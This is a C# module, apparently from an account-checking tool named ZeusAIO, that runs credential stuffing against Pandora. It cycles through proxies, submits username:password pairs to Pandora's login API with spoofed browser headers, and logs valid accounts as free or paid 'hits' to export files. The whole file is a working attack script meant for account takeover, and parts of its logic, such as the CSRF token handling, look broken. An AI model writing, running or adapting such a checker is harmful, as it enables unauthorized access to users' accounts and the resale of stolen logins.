using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using System.Security.Authentication;
using System.Net;
using checker;

namespace Pandora
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                           req.AllowAutoRedirect = false;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                            req.AddHeader("Pragma", "no-cache");
                            req.AddHeader("Accept", "*/*");
                            CookieStorage cookies = new CookieStorage();
                            string csrf = cookies.GetCookies("https://www.pandora.com/account/sign-in")["csrftoken"].Value;
                            Console.WriteLine(csrf);
                            req.AddHeader("accept", "application/json, text/plain, */*");
                            req.AddHeader("accept-encoding", "gzip, deflate, br");
                            req.AddHeader("accept-language", "en-US,en;q=0.9");
                            req.AddHeader("content-length", "98");
                            req.AddHeader("content-type", "application/json");
                            req.AddHeader("cookie", "csrftoken=" + csrf + ";");
                            req.AddHeader("origin", "https://www.pandora.com");
                            req.AddHeader("referer", "https://www.pandora.com/account/sign-in");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("sec-fetch-site", "same-origin");
                            req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36");
                            req.AddHeader("x-csrftoken", "" + csrf + "");

                            var res1 = req.Post("https://www.pandora.com/api/v1/auth/login", "{\"existingAuthToken\":null,\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"keepLoggedIn\":true}", "application/json");
                            string text1 = res1.ToString();

                            if (text1.Contains("authToken"))
                            {
                                var Plan = Functions.LR(text1, "branding\":\"", "\"").FirstOrDefault();
                                if (Plan == "Pandora")
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - PANDORA] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Pandora_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - PANDORA] " + s[0] + ":" + s[1] + " | Plan: " + Plan, Color.Green);
                                    }
                                    Export.AsResult("/Pandora_hits", s[0] + ":" + s[1] + " | Plan: " + Plan);
                                    return false;
                                }


                            }
                            else if (text1.Contains("AUTH_INVALID_USERNAME_PASSWORD"))
                            {
                                break; //bad
                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }


                        }

                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    }
}

